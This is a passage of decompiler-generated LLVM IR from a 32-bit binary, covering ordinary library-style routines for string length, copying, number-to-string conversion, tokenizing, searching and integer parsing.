  uselistorder label %dec_label_pc_403e58, { 1, 0 }
  uselistorder label %dec_label_pc_403d6c, { 1, 0 }
}

define i32 @function_403e84() local_unnamed_addr {
dec_label_pc_403e84:
  %v0_403e84 = load i32, i32* @v0, align 4
  ret i32 %v0_403e84
}

define i32 @function_403e88() local_unnamed_addr {
dec_label_pc_403e88:
  %v0_403e90.pre = load i32, i32* @a0, align 4
  br label %dec_label_pc_403e8c

dec_label_pc_403e8c:                              ; preds = %dec_label_pc_403e8c, %dec_label_pc_403e88
  %v0_403e90 = phi i32 [ %v3_403e98, %dec_label_pc_403e8c ], [ %v0_403e90.pre, %dec_label_pc_403e88 ]
  %v0_403e8c = phi i32 [ %v1_403e8c, %dec_label_pc_403e8c ], [ 0, %dec_label_pc_403e88 ]
  %v1_403e8c = add i32 %v0_403e8c, 1
  %v1_403e90 = inttoptr i32 %v0_403e90 to i8*
  %v2_403e90 = load i8, i8* %v1_403e90, align 1
  %v1_403e98 = icmp eq i8 %v2_403e90, 0
  %v3_403e98 = add i32 %v0_403e90, 1
  br i1 %v1_403e98, label %dec_label_pc_403e9c, label %dec_label_pc_403e8c

dec_label_pc_403e9c:                              ; preds = %dec_label_pc_403e8c
  ret i32 %v1_403e8c

; uselistorder directives
  uselistorder i32 %v0_403e90, { 1, 0 }
}

define i32 @function_403ea8(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_403ea8:
  %v0.global-to-local = alloca i32, align 4
  %v1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_403eac

dec_label_pc_403eac:                              ; preds = %dec_label_pc_403eac, %dec_label_pc_403ea8
  %v0_403eac = phi i32 [ %v3_403eb4, %dec_label_pc_403eac ], [ %tmp, %dec_label_pc_403ea8 ]
  %v1_403eac = inttoptr i32 %v0_403eac to i8*
  %v2_403eac = load i8, i8* %v1_403eac, align 1
  %v3_403eac = sext i8 %v2_403eac to i32
  store i32 %v3_403eac, i32* %v0.global-to-local, align 4
  %v1_403eb4 = icmp eq i8 %v2_403eac, 0
  %v3_403eb4 = add i32 %v0_403eac, 1
  store i32 %v3_403eb4, i32* %v1.global-to-local, align 4
  br i1 %v1_403eb4, label %dec_label_pc_403eb8, label %dec_label_pc_403eac

dec_label_pc_403eb8:                              ; preds = %dec_label_pc_403eac
  store i32 %v0_403eac, i32* %v1.global-to-local, align 4
  br label %dec_label_pc_403ec0

dec_label_pc_403ec0:                              ; preds = %dec_label_pc_403ec0, %dec_label_pc_403eb8
  %v2_403ec8 = phi i32 [ %v3_403ecc, %dec_label_pc_403ec0 ], [ %v0_403eac, %dec_label_pc_403eb8 ]
  %v0_403ec0 = load i32, i32* @a1, align 4
  %v1_403ec0 = inttoptr i32 %v0_403ec0 to i8*
  %v2_403ec0 = load i8, i8* %v1_403ec0, align 1
  %v3_403ec0 = sext i8 %v2_403ec0 to i32
  store i32 %v3_403ec0, i32* %v0.global-to-local, align 4
  %v1_403ec4 = add i32 %v0_403ec0, 1
  store i32 %v1_403ec4, i32* @a1, align 4
  %v3_403ec8 = inttoptr i32 %v2_403ec8 to i8*
  store i8 %v2_403ec0, i8* %v3_403ec8, align 1
  %v0_403ecc = load i32, i32* %v0.global-to-local, align 4
  %v1_403ecc = icmp eq i32 %v0_403ecc, 0
  %v2_403ecc = load i32, i32* %v1.global-to-local, align 4
  %v3_403ecc = add i32 %v2_403ecc, 1
  store i32 %v3_403ecc, i32* %v1.global-to-local, align 4
  br i1 %v1_403ecc, label %dec_label_pc_403ed0, label %dec_label_pc_403ec0

dec_label_pc_403ed0:                              ; preds = %dec_label_pc_403ec0
  store i32 %tmp, i32* %v0.global-to-local, align 4
  ret i32 %tmp

; uselistorder directives
  uselistorder i32 %v3_403ecc, { 1, 0 }
  uselistorder i32 %v3_403eb4, { 1, 0 }
  uselistorder i32 %v0_403eac, { 0, 1, 3, 2 }
  uselistorder i32 %tmp, { 2, 1, 0, 3 }
}

define i32 @function_403edc(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_403edc:
  %v0_403edc = load i32, i32* @v0, align 4
  ret i32 %v0_403edc
}

define i32 @function_403ee0() local_unnamed_addr {
dec_label_pc_403ee0:
  %v1.global-to-local = alloca i32, align 4
  store i32 -1, i32* %v1.global-to-local, align 4
  %v3_403eec.pre = load i32, i32* @a0, align 4
  br label %dec_label_pc_403ee4

dec_label_pc_403ee4:                              ; preds = %dec_label_pc_403ee4, %dec_label_pc_403ee0
  %v3_403eec = phi i32 [ %v1_403ef0, %dec_label_pc_403ee4 ], [ %v3_403eec.pre, %dec_label_pc_403ee0 ]
  %v0_403ee4 = load i32, i32* @a1, align 4
  %v1_403ee4 = inttoptr i32 %v0_403ee4 to i8*
  %v2_403ee4 = load i8, i8* %v1_403ee4, align 1
  %v1_403ee8 = add i32 %v0_403ee4, 1
  store i32 %v1_403ee8, i32* @a1, align 4
  %v4_403eec = inttoptr i32 %v3_403eec to i8*
  store i8 %v2_403ee4, i8* %v4_403eec, align 1
  %v0_403ef0 = load i32, i32* @a0, align 4
  %v1_403ef0 = add i32 %v0_403ef0, 1
  store i32 %v1_403ef0, i32* @a0, align 4
  %v0_403ef4 = load i32, i32* @a2, align 4
  %v1_403ef4 = add i32 %v0_403ef4, -1
  store i32 %v1_403ef4, i32* @a2, align 4
  %v1_403ef8 = load i32, i32* %v1.global-to-local, align 4
  %v2_403ef8 = icmp eq i32 %v1_403ef4, %v1_403ef8
  br i1 %v2_403ef8, label %dec_label_pc_403efc, label %dec_label_pc_403ee4

dec_label_pc_403efc:                              ; preds = %dec_label_pc_403ee4
  %v2_403f00 = sext i8 %v2_403ee4 to i32
  ret i32 %v2_403f00

; uselistorder directives
  uselistorder i32 %v1_403ef0, { 1, 0 }
}

define i32 @function_403f08(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_403f08:
  %s0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %s0.global-to-local, align 4
  br label %dec_label_pc_403f30

dec_label_pc_403f30:                              ; preds = %dec_label_pc_403f30, %dec_label_pc_403f08
  %v2_403f3c = phi i32 [ %tmp, %dec_label_pc_403f08 ], [ %v3_403f3c, %dec_label_pc_403f30 ]
  %.0 = phi i32 [ undef, %dec_label_pc_403f08 ], [ %v1_403f38, %dec_label_pc_403f30 ]
  store i32 %.0, i32* %s0.global-to-local, align 4
  %v1_403f34 = inttoptr i32 %v2_403f3c to i8*
  %v2_403f34 = load i8, i8* %v1_403f34, align 1
  %v3_403f34 = sext i8 %v2_403f34 to i32
  store i32 %v3_403f34, i32* @v0, align 4
  %v1_403f38 = add i32 %.0, 1
  store i32 %v1_403f38, i32* @a2, align 4
  %v1_403f3c = icmp eq i8 %v2_403f34, 0
  %v3_403f3c = add i32 %v2_403f3c, 1
  br i1 %v1_403f3c, label %dec_label_pc_403f40, label %dec_label_pc_403f30

dec_label_pc_403f40:                              ; preds = %dec_label_pc_403f30
  %v5_403f4c = call i32 @function_403edc(i32 %v1_403f38, i32 %tmp, i32 %v1_403f38)
  %v0_403f54 = load i32, i32* %s0.global-to-local, align 4
  ret i32 %v0_403f54

; uselistorder directives
  uselistorder i32 %v1_403f38, { 1, 0, 3, 2 }
  uselistorder i32 %.0, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @function_403edc, { 3, 1, 2, 0 }
}

define i32 @function_403f6c(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_403f6c:
  %a0.global-to-local = alloca i32, align 4
  %a1.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %v1_403f6c = mul i32 %arg1, 16777216
  %v1_403f70 = sdiv i32 %v1_403f6c, 16777216
  store i32 %v1_403f70, i32* %a1.global-to-local, align 4
  %v2_403f7c.pre = load i32, i32* @a0, align 4
  %extract.t8 = trunc i32 %v1_403f70 to i8
  %v3_403f7c9 = inttoptr i32 %v2_403f7c.pre to i8*
  store i8 %extract.t8, i8* %v3_403f7c9, align 1
  %v0_403f8010 = load i32, i32* @a0, align 4
  %v1_403f8011 = add i32 %v0_403f8010, 1
  store i32 %v1_403f8011, i32* %a0.global-to-local, align 4
  %v0_403f8412 = load i32, i32* @a2, align 4
  %v1_403f8413 = add i32 %v0_403f8412, -1
  store i32 %v1_403f8413, i32* %a2.global-to-local, align 4
  %v2_403f8814 = icmp eq i32 %v0_403f8412, 0
  br i1 %v2_403f8814, label %dec_label_pc_403f8c, label %dec_label_pc_403f7c.dec_label_pc_403f7c_crit_edge

dec_label_pc_403f7c.dec_label_pc_403f7c_crit_edge: ; preds = %dec_label_pc_403f6c, %dec_label_pc_403f7c.dec_label_pc_403f7c_crit_edge
  %v1_403f8015 = phi i32 [ %v1_403f80, %dec_label_pc_403f7c.dec_label_pc_403f7c_crit_edge ], [ %v1_403f8011, %dec_label_pc_403f6c ]
  %v0_403f7c.pre = load i32, i32* %a1.global-to-local, align 4
  %extract.t = trunc i32 %v0_403f7c.pre to i8
  %v3_403f7c = inttoptr i32 %v1_403f8015 to i8*
  store i8 %extract.t, i8* %v3_403f7c, align 1
  %v0_403f80 = load i32, i32* %a0.global-to-local, align 4
  %v1_403f80 = add i32 %v0_403f80, 1
  store i32 %v1_403f80, i32* %a0.global-to-local, align 4
  %v0_403f84 = load i32, i32* %a2.global-to-local, align 4
  %v1_403f84 = add i32 %v0_403f84, -1
  store i32 %v1_403f84, i32* %a2.global-to-local, align 4
  %v2_403f88 = icmp eq i32 %v0_403f84, 0
  br i1 %v2_403f88, label %dec_label_pc_403f8c, label %dec_label_pc_403f7c.dec_label_pc_403f7c_crit_edge

dec_label_pc_403f8c:                              ; preds = %dec_label_pc_403f7c.dec_label_pc_403f7c_crit_edge, %dec_label_pc_403f6c
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v1_403f80, { 1, 0 }
  uselistorder i32 %v1_403f70, { 1, 0 }
  uselistorder i32* %a2.global-to-local, { 2, 1, 0 }
  uselistorder i32* %a0.global-to-local, { 2, 1, 0 }
  uselistorder i32 16777216, { 1, 0, 2, 3, 4, 6, 5 }
  uselistorder label %dec_label_pc_403f7c.dec_label_pc_403f7c_crit_edge, { 1, 0 }
}

define i32 @function_403f98(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_403f98:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_403fa4 = icmp eq i8* %arg1, null
  br i1 %v2_403fa4, label %dec_label_pc_403fb4.thread, label %dec_label_pc_403fb4

dec_label_pc_403fb4.thread:                       ; preds = %dec_label_pc_403f98
  br label %dec_label_pc_403fb8

dec_label_pc_403fb4:                              ; preds = %dec_label_pc_403f98
  %v0_403fb4.pr = load i32, i32* @a0, align 4
  %v1_403fb4 = icmp eq i32 %v0_403fb4.pr, 0
  br i1 %v1_403fb4, label %dec_label_pc_403fb8, label %dec_label_pc_403fd4.preheader

dec_label_pc_403fb8:                              ; preds = %dec_label_pc_403fb4.thread, %dec_label_pc_403fb4
  %v3_403fc4 = load i8*, i8** @global_var_449ce4.173, align 4
  %v4_403fc4 = ptrtoint i8* %v3_403fc4 to i32
  store i32 %v4_403fc4, i32* @a0, align 4
  %v1_403fcc = icmp eq i8* %v3_403fc4, null
  br i1 %v1_403fcc, label %dec_label_pc_404070, label %dec_label_pc_403fd4.preheader

dec_label_pc_403fd4.preheader:                    ; preds = %dec_label_pc_403fb4, %dec_label_pc_403fb8
  %v3_404028 = phi i32 [ %v0_403fb4.pr, %dec_label_pc_403fb4 ], [ %v4_403fc4, %dec_label_pc_403fb8 ]
  br label %dec_label_pc_403fd4

dec_label_pc_403fd4:                              ; preds = %dec_label_pc_403fd4.preheader, %dec_label_pc_403fd4
  %v2_403fe0 = phi i32 [ 0, %dec_label_pc_403fd4.preheader ], [ %v3_403fe0, %dec_label_pc_403fd4 ]
  %v2_403fd4 = add i32 %v2_403fe0, %v3_404028
  %v1_403fd8 = inttoptr i32 %v2_403fd4 to i8*
  %v2_403fd8 = load i8, i8* %v1_403fd8, align 1
  %v1_403fe0 = icmp eq i8 %v2_403fd8, 0
  %v3_403fe0 = add i32 %v2_403fe0, 1
  br i1 %v1_403fe0, label %dec_label_pc_403fe4, label %dec_label_pc_403fd4

dec_label_pc_403fe4:                              ; preds = %dec_label_pc_403fd4
  %v0_403ff4.pre = load i32, i32* @a2, align 4
  br label %dec_label_pc_403ff4

dec_label_pc_403ff4:                              ; preds = %dec_label_pc_404004, %dec_label_pc_403fe4
  %v2_404010 = phi i32 [ %v3_404010, %dec_label_pc_404004 ], [ 0, %dec_label_pc_403fe4 ]
  %v0_403ff4 = phi i32 [ %v2_40400c, %dec_label_pc_404004 ], [ %v0_403ff4.pre, %dec_label_pc_403fe4 ]
  %v1_403ff4 = inttoptr i32 %v0_403ff4 to i8*
  %v2_403ff4 = load i8, i8* %v1_403ff4, align 1
  %v3_403ff8 = load i8, i8* %arg1, align 1
  %v2_404000 = icmp eq i8 %v3_403ff8, %v2_403ff4
  br i1 %v2_404000, label %dec_label_pc_404020, label %dec_label_pc_404004

dec_label_pc_404004:                              ; preds = %dec_label_pc_403ff4
  %v2_404008 = icmp slt i32 %v2_404010, %v2_403fe0
  %v2_40400c = add i32 %v2_404010, %v3_404028
  store i32 %v2_40400c, i32* @a2, align 4
  %v3_404010 = add nuw i32 %v2_404010, 1
  br i1 %v2_404008, label %dec_label_pc_403ff4, label %dec_label_pc_404020

dec_label_pc_404020:                              ; preds = %dec_label_pc_404004, %dec_label_pc_403ff4
  %v3_403ff8.lcssa = phi i8 [ %v3_403ff8, %dec_label_pc_404004 ], [ %v2_403ff4, %dec_label_pc_403ff4 ]
  %v0_404048 = phi i32 [ %v2_40400c, %dec_label_pc_404004 ], [ %v0_403ff4, %dec_label_pc_403ff4 ]
  %v1_404020 = inttoptr i32 %v3_404028 to i8*
  %v2_404020 = load i8, i8* %v1_404020, align 1
  %v2_404028 = icmp eq i8 %v2_404020, %v3_403ff8.lcssa
  br i1 %v2_404028, label %dec_label_pc_40402c, label %dec_label_pc_404040

dec_label_pc_40402c:                              ; preds = %dec_label_pc_404020
  %v4_404028 = add i32 %v3_404028, 1
  store i32 %tmp, i32* @a0, align 4
  %v4_40403c = inttoptr i32 %v4_404028 to i8*
  store i8* %v4_40403c, i8** @global_var_449ce4.173, align 4
  br label %dec_label_pc_404040

dec_label_pc_404040:                              ; preds = %dec_label_pc_404020, %dec_label_pc_40402c
  %v2_404048 = icmp eq i32 %v0_404048, -1
  %v4_404048 = inttoptr i32 %v0_404048 to i8*
  store i8 0, i8* %v4_404048, align 1
  br i1 %v2_404048, label %dec_label_pc_40405c, label %dec_label_pc_40404c

dec_label_pc_40404c:                              ; preds = %dec_label_pc_404040
  %v0_404050 = load i32, i32* @a2, align 4
  %v1_404050 = add i32 %v0_404050, 1
  %v4_404058 = inttoptr i32 %v1_404050 to i8*
  store i8* %v4_404058, i8** @global_var_449ce4.173, align 4
  br label %dec_label_pc_40405c

dec_label_pc_40405c:                              ; preds = %dec_label_pc_404040, %dec_label_pc_40404c
  store i8* null, i8** @global_var_449ce4.173, align 4
  %v1_404070.pre = load i32, i32* @a0, align 4
  br label %dec_label_pc_404070

dec_label_pc_404070:                              ; preds = %dec_label_pc_403fb8, %dec_label_pc_40405c
  %v1_404070 = phi i32 [ %v4_403fc4, %dec_label_pc_403fb8 ], [ %v1_404070.pre, %dec_label_pc_40405c ]
  ret i32 %v1_404070

; uselistorder directives
  uselistorder i32 %v0_404048, { 1, 0 }
  uselistorder i32 %v2_40400c, { 0, 2, 1 }
  uselistorder i32 %v2_404010, { 1, 0, 2 }
  uselistorder i32 %v2_403fe0, { 0, 2, 1 }
  uselistorder i32 %v3_404028, { 2, 3, 0, 1 }
  uselistorder i8** @global_var_449ce4.173, { 3, 2, 1, 0 }
  uselistorder i8* null, { 2, 0, 1 }
  uselistorder label %dec_label_pc_404070, { 1, 0 }
  uselistorder label %dec_label_pc_40405c, { 1, 0 }
  uselistorder label %dec_label_pc_404040, { 1, 0 }
  uselistorder label %dec_label_pc_403fd4, { 1, 0 }
  uselistorder label %dec_label_pc_403fd4.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_403fb8, { 1, 0 }
}

define i32 @function_404078(i32 %arg1, i32 %arg2, i8* %arg3) local_unnamed_addr {
dec_label_pc_404078:
  %a0.global-to-local = alloca i32, align 4
  %a2.global-to-local = alloca i32, align 4
  %lo.global-to-local = alloca i32, align 4
  %t0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg3 to i32
  store i32 %tmp, i32* @a2, align 4
  store i32 %arg1, i32* %a0.global-to-local, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_404094 = load i32, i32* @a2, align 4
  %v1_404094 = icmp eq i32 %v0_404094, 0
  store i32 %v0_404094, i32* @s0, align 4
  br i1 %v1_404094, label %dec_label_pc_404150, label %dec_label_pc_404098

dec_label_pc_404098:                              ; preds = %dec_label_pc_404078
  %v0_40409c = load i32, i32* %a0.global-to-local, align 4
  %v1_40409c = icmp eq i32 %v0_40409c, 0
  br i1 %v1_40409c, label %dec_label_pc_404148, label %dec_label_pc_4040a0

dec_label_pc_4040a0:                              ; preds = %dec_label_pc_404098
  %v2_4040a8 = icmp ne i32 %arg2, 10
  store i32 0, i32* %t0.global-to-local, align 4
  %v1_4040b0 = icmp sgt i32 %v0_40409c, -1
  %or.cond = or i1 %v2_4040a8, %v1_4040b0
  br i1 %or.cond, label %dec_label_pc_4040c0, label %dec_label_pc_4040b4

dec_label_pc_4040b4:                              ; preds = %dec_label_pc_4040a0
  %v1_4040b8 = sub i32 0, %v0_40409c
  store i32 %v1_4040b8, i32* %a0.global-to-local, align 4
  store i32 1, i32* %t0.global-to-local, align 4
  br label %dec_label_pc_4040c0

dec_label_pc_4040c0:                              ; preds = %dec_label_pc_4040a0, %dec_label_pc_4040b4
  %v2_4040cc2 = phi i32 [ %v0_40409c, %dec_label_pc_4040a0 ], [ %v1_4040b8, %dec_label_pc_4040b4 ]
  store i32 32, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_4040cc

dec_label_pc_4040cc:                              ; preds = %dec_label_pc_4040f8, %dec_label_pc_4040c0
  %v1_4040f8 = phi i32 [ %v1_404100, %dec_label_pc_4040f8 ], [ 32, %dec_label_pc_4040c0 ]
  %v2_4040ec = phi i32 [ %v0_404104, %dec_label_pc_4040f8 ], [ %v2_4040cc2, %dec_label_pc_4040c0 ]
  %v4_4040cc = udiv i32 %v2_4040ec, %arg2
  store i32 %v4_4040cc, i32* %lo.global-to-local, align 4
  %v5_4040cc = urem i32 %v2_4040ec, %arg2
  %v1_4040dc = icmp slt i32 %v5_4040cc, 10
  %v3_4040e0 = add i32 %v5_4040cc, 48
  %extract.t9 = trunc i32 %v3_4040e0 to i8
  br i1 %v1_4040dc, label %dec_label_pc_4040f8, label %dec_label_pc_4040e4

dec_label_pc_4040e4:                              ; preds = %dec_label_pc_4040cc
  %v1_4040e8 = add i32 %v5_4040cc, 55
  store i32 %v4_4040cc, i32* %lo.global-to-local, align 4
  %extract.t = trunc i32 %v1_4040e8 to i8
  br label %dec_label_pc_4040f8

dec_label_pc_4040f8:                              ; preds = %dec_label_pc_4040e4, %dec_label_pc_4040cc
  %v0_4040fc.off0 = phi i8 [ %extract.t, %dec_label_pc_4040e4 ], [ %extract.t9, %dec_label_pc_4040cc ]
  %v0_4040f8 = load i32, i32* @sp, align 4
  %v2_4040f8 = add i32 %v0_4040f8, %v1_4040f8
  %v3_4040fc = add i32 %v2_4040f8, 24
  %v4_4040fc = inttoptr i32 %v3_4040fc to i8*
  store i8 %v0_4040fc.off0, i8* %v4_4040fc, align 1
  %v0_404100 = load i32, i32* %a2.global-to-local, align 4
  %v1_404100 = add i32 %v0_404100, -1
  store i32 %v1_404100, i32* %a2.global-to-local, align 4
  %v0_404104 = load i32, i32* %lo.global-to-local, align 4
  store i32 %v0_404104, i32* %a0.global-to-local, align 4
  %v1_404108 = icmp eq i32 %v0_404104, 0
  br i1 %v1_404108, label %dec_label_pc_40410c, label %dec_label_pc_4040cc

dec_label_pc_40410c:                              ; preds = %dec_label_pc_4040f8
  %v0_404110 = load i32, i32* %t0.global-to-local, align 4
  %v1_404110 = icmp eq i32 %v0_404110, 0
  br i1 %v1_404110, label %dec_label_pc_404124, label %dec_label_pc_404114

dec_label_pc_404114:                              ; preds = %dec_label_pc_40410c
  %v2_404110 = load i32, i32* @sp, align 4
  %v4_404110 = add i32 %v2_404110, %v1_404100
  %v3_404120 = add i32 %v4_404110, 24
  %v4_404120 = inttoptr i32 %v3_404120 to i8*
  store i8 45, i8* %v4_404120, align 1
  %v0_404124.pre = load i32, i32* %a2.global-to-local, align 4
  br label %dec_label_pc_404124

dec_label_pc_404124:                              ; preds = %dec_label_pc_40410c, %dec_label_pc_404114
  %v0_404124 = phi i32 [ %v1_404100, %dec_label_pc_40410c ], [ %v0_404124.pre, %dec_label_pc_404114 ]
  %v1_404124 = add i32 %v0_404124, 1
  store i32 %v1_404124, i32* %a2.global-to-local, align 4
  %v3_404128 = load i32, i32* @global_var_449ac8.59, align 4
  store i32 %v3_404128, i32* @t9, align 4
  %v2_40412c = ptrtoint i32* %stack_var_-48 to i32
  %v2_404130 = add i32 %v1_404124, %v2_40412c
  %v1_404134 = load i32, i32* @s0, align 4
  %v2_404134 = inttoptr i32 %v1_404134 to i8*
  store i32 %v1_404134, i32* %a0.global-to-local, align 4
  %v7_404134 = call i32 @function_403f08(i8* %v2_404134, i32 %v2_404130)
  %v0_404144 = load i32, i32* @s0, align 4
  %v2_404148.pre = load i32, i32* @a2, align 4
  %extract.t10 = trunc i32 %v0_404144 to i8
  br label %dec_label_pc_404148

dec_label_pc_404148:                              ; preds = %dec_label_pc_404098, %dec_label_pc_404124
  %v2_404148 = phi i32 [ %v0_404094, %dec_label_pc_404098 ], [ %v2_404148.pre, %dec_label_pc_404124 ]
  %v0_404148.off0 = phi i8 [ 48, %dec_label_pc_404098 ], [ %extract.t10, %dec_label_pc_404124 ]
  %v3_404148 = inttoptr i32 %v2_404148 to i8*
  store i8 %v0_404148.off0, i8* %v3_404148, align 1
  %v0_40414c = load i32, i32* @a2, align 4
  %v1_40414c = add i32 %v0_40414c, 1
  %v2_40414c = inttoptr i32 %v1_40414c to i8*
  store i8 0, i8* %v2_40414c, align 1
  %v0_404150.pre = load i32, i32* @s0, align 4
  br label %dec_label_pc_404150

dec_label_pc_404150:                              ; preds = %dec_label_pc_404078, %dec_label_pc_404148
  %v0_404150 = phi i32 [ 0, %dec_label_pc_404078 ], [ %v0_404150.pre, %dec_label_pc_404148 ]
  ret i32 %v0_404150

; uselistorder directives
  uselistorder i32 %v1_404134, { 1, 0 }
  uselistorder i32 %v0_404104, { 1, 2, 0 }
  uselistorder i32 %v1_404100, { 1, 0, 3, 2 }
  uselistorder i32 %v5_4040cc, { 0, 2, 1 }
  uselistorder i32 %v2_4040ec, { 1, 0 }
  uselistorder i32 %v0_40409c, { 0, 2, 1, 3 }
  uselistorder i32* %t0.global-to-local, { 1, 2, 0 }
  uselistorder i32* %lo.global-to-local, { 1, 0, 2 }
  uselistorder i32* %a0.global-to-local, { 2, 3, 4, 0, 1 }
  uselistorder i32 (i8*, i32)* @function_403f08, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_404150, { 1, 0 }
  uselistorder label %dec_label_pc_404148, { 1, 0 }
  uselistorder label %dec_label_pc_404124, { 1, 0 }
  uselistorder label %dec_label_pc_4040c0, { 1, 0 }
}

define i32 @function_404164(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_404164:
  %t1.global-to-local = alloca i32, align 4
  store i32 0, i32* %t1.global-to-local, align 4
  %v2_404164 = icmp sgt i32 %arg4, %arg2
  br i1 %v2_404164, label %dec_label_pc_4041bc, label %dec_label_pc_40416c

dec_label_pc_40416c:                              ; preds = %dec_label_pc_404164
  %v0_404178.pre = load i32, i32* @v1, align 4
  %v0_40417c.pre = load i32, i32* %t1.global-to-local, align 4
  br label %dec_label_pc_404178

dec_label_pc_404178:                              ; preds = %dec_label_pc_4041a8, %dec_label_pc_40416c
  %v0_40418c = phi i32 [ %v3_4041b4, %dec_label_pc_4041a8 ], [ 0, %dec_label_pc_40416c ]
  %v3_40418c = phi i32 [ %v1_4041b0, %dec_label_pc_4041a8 ], [ 0, %dec_label_pc_40416c ]
  %v0_40417c = phi i32 [ %v2_4041ac, %dec_label_pc_4041a8 ], [ %v0_40417c.pre, %dec_label_pc_40416c ]
  %v0_404178 = phi i32 [ %v2_4041b0, %dec_label_pc_4041a8 ], [ %v0_404178.pre, %dec_label_pc_40416c ]
  %v1_404178 = inttoptr i32 %v0_404178 to i8*
  %v2_404178 = load i8, i8* %v1_404178, align 1
  %v1_40417c = inttoptr i32 %v0_40417c to i8*
  %v2_40417c = load i8, i8* %v1_40417c, align 1
  %v2_404184 = icmp eq i8 %v2_404178, %v2_40417c
  br i1 %v2_404184, label %dec_label_pc_404188, label %dec_label_pc_4041a0

dec_label_pc_404188:                              ; preds = %dec_label_pc_404178
  %v2_40418c = icmp eq i32 %v0_40418c, %arg4
  %v4_40418c = add i32 %v3_40418c, 1
  br i1 %v2_40418c, label %dec_label_pc_404190, label %dec_label_pc_4041a8

dec_label_pc_404190:                              ; preds = %dec_label_pc_404188
  ret i32 %v4_40418c

dec_label_pc_4041a0:                              ; preds = %dec_label_pc_404178
  %v1_4041a4 = add i32 %v3_40418c, 1
  br label %dec_label_pc_4041a8

dec_label_pc_4041a8:                              ; preds = %dec_label_pc_404188, %dec_label_pc_4041a0
  %v2_4041b4 = phi i32 [ %v0_40418c, %dec_label_pc_404188 ], [ 0, %dec_label_pc_4041a0 ]
  %v1_4041b0 = phi i32 [ %v4_40418c, %dec_label_pc_404188 ], [ %v1_4041a4, %dec_label_pc_4041a0 ]
  %v2_4041a8 = icmp slt i32 %v1_4041b0, %arg2
  %v2_4041ac = add i32 %v2_4041b4, %arg3
  store i32 %v2_4041ac, i32* %t1.global-to-local, align 4
  %v2_4041b0 = add i32 %v1_4041b0, %arg1
  %v1_4041b4 = icmp eq i1 %v2_4041a8, false
  %v3_4041b4 = add i32 %v2_4041b4, 1
  br i1 %v1_4041b4, label %dec_label_pc_4041bc, label %dec_label_pc_404178

dec_label_pc_4041bc:                              ; preds = %dec_label_pc_4041a8, %dec_label_pc_404164
  ret i32 -1

; uselistorder directives
  uselistorder i32 %v2_4041ac, { 1, 0 }
  uselistorder i32 %v1_4041b0, { 0, 2, 1 }
  uselistorder i32 %v2_4041b4, { 1, 0 }
  uselistorder i32 %v4_40418c, { 1, 0 }
  uselistorder i32 %v3_40418c, { 1, 0 }
  uselistorder i32* %t1.global-to-local, { 2, 0, 1 }
  uselistorder i32 %arg4, { 1, 0 }
  uselistorder label %dec_label_pc_4041a8, { 1, 0 }
}

define i32 @function_4041c4(i64 %arg1) local_unnamed_addr {
dec_label_pc_4041c4:
  %tmp = trunc i64 %arg1 to i32
  %v0_4041d0.pre = load i32, i32* @a0, align 4
  br label %dec_label_pc_4041d0

dec_label_pc_4041d0:                              ; preds = %dec_label_pc_4041d0, %dec_label_pc_4041d0, %dec_label_pc_4041e4, %dec_label_pc_4041c4
  %v0_4041d0 = phi i32 [ %v0_4041d0.pre, %dec_label_pc_4041c4 ], [ %v1_4041d4, %dec_label_pc_4041e4 ], [ %v1_4041d4, %dec_label_pc_4041d0 ], [ %v1_4041d4, %dec_label_pc_4041d0 ]
  %v1_4041d0 = inttoptr i32 %v0_4041d0 to i8*
  %v2_4041d0 = load i8, i8* %v1_4041d0, align 1
  %v3_4041d0 = sext i8 %v2_4041d0 to i32
  %v1_4041d4 = add i32 %v0_4041d0, 1
  switch i8 %v2_4041d0, label %dec_label_pc_4041e4 [
    i8 32, label %dec_label_pc_4041d0
    i8 9, label %dec_label_pc_4041d0
  ]

dec_label_pc_4041e4:                              ; preds = %dec_label_pc_4041d0
  %v2_4041e8 = icmp eq i8 %v2_4041d0, 10
  br i1 %v2_4041e8, label %dec_label_pc_4041d0, label %dec_label_pc_4041ec

dec_label_pc_4041ec:                              ; preds = %dec_label_pc_4041e4
  %v1_4041fc = add i32 %v0_4041d0, 2
  %v2_4042a0 = icmp ugt i32 %tmp, 43
  br label %dec_label_pc_404208

dec_label_pc_404208:                              ; preds = %dec_label_pc_4042fc, %dec_label_pc_4041ec
  %v1_40432820 = phi i32 [ %v1_404304, %dec_label_pc_4042fc ], [ 10, %dec_label_pc_4041ec ]
  %v0_404214 = phi i32 [ %v0_404214824, %dec_label_pc_4042fc ], [ %v1_4041fc, %dec_label_pc_4041ec ]
  %v0_40420c = phi i32 [ %v0_40430823, %dec_label_pc_4042fc ], [ %v3_4041d0, %dec_label_pc_4041ec ]
  %v2_40420c = icmp eq i32 %v0_40420c, 43
  br i1 %v2_40420c, label %dec_label_pc_404210, label %dec_label_pc_404328

dec_label_pc_404210:                              ; preds = %dec_label_pc_404208
  %v1_404214 = inttoptr i32 %v0_404214 to i8*
  %v2_404214 = load i8, i8* %v1_404214, align 1
  %v3_404214 = sext i8 %v2_404214 to i32
  %v1_40421c = add i32 %v0_404214, 1
  %v7_404220 = urem i32 43, %tmp
  %v1_40423c = urem i32 %v3_404214, 256
  %fold = add nsw i32 %v3_404214, 208
  %v1_404244 = and i32 %fold, 254
  %v1_404248 = icmp ult i32 %v1_404244, 10
  %v1_40424c = icmp eq i1 %v1_404248, false
